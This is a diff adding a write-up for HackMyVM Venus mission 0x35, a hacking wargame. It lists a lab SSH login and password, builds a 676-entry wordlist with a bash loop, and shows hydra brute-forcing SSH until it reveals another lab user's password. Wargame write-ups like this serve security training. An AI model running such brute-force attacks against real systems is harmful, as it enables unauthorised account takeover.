@@ -1,0 +1,54 @@
+# Login using the following credentials.
+
+ssh maia@venus.hackmyvm.eu -p 5000
+
+pwd: h1hnDPHpydEjoEN
+
+Mission 0x35:
+The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters.
+
+Soln:
+
+-> This is another typical case of bash scripting and using brute force method with 'hydra'.
+-> They have given us the password for 'gloria' user but it is missing the last 2 letters. Given in the question that the last two letters are 2 lowercase letters.
+
+-> Therefore we need to try all possible combinations of the 2 lowercase letters which comes down to 676 (26x26) combinations.
+-> Let's start with the basics. Try to print the all possible combinations of 2 lowercase letters in bash.
+
+# ┌──(amogha㉿Amogha)-[~]
+# └─$ echo {a..z}{a..z}
+# aa ab ac ad ae af ag ah .. zx zy zz
+
+-> The above command will print all the combinations in a single line.
+-> We need to print the same but at the end of the password in a sepearte line of its own as shown below.
+
+# v7xUVE2e5bjUcaa
+# v7xUVE2e5bjUcab
+# v7xUVE2e5bjUcac
+# ....
+
+-> To do so we need to run a for loop and then add the given incomplete password with it as well. 
+
+# ┌──(amogha㉿Amogha)-[~/hackmyvm_venus/maia]
+# └─$ for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i";done>brute_force
+
+-> In the active directory of the 'maia' user there is a file called 'forget' which contains the incomplete password. Hence I got the string "v7xUVE2e5bjUc??" out of it. Remove those 2 question marks and use it as shown above in the command.
+
+-> We have got ourselves a file called 'brute_force' containing 676 lines of possible combinations of passwords to try from. Now it is straight forwards from here on.
+
+*Note: I have done the above operations in my local machine so that I can use the 'hydra' application to brute force the user password.
+
+-> Now using the same command of 'hydra' to start the brute force.
+
+# ┌──(amogha㉿Amogha)-[~/hackmyvm_venus/maia]
+# └─$ hydra -s 5000 -l gloria -P brute_force venus.hackmyvm.eu ssh
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-28 23:15:20
+# ...
+# [DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:1/p:676), ~43 tries per task
+# [DATA] attacking ssh://venus.hackmyvm.eu:5000/
+# [STATUS] 149.00 tries/min, 149 tries in 00:01h, 528 to do in 00:04h, 15 active
+# [STATUS] 185.67 tries/min, 557 tries in 00:03h, 120 to do in 00:01h, 15 active
+# [5000][ssh] host: venus.hackmyvm.eu   login: gloria   password: v7xUVE2e5bjUcxw
+# ...
+
+-> There you go we have got the password that we wanted.
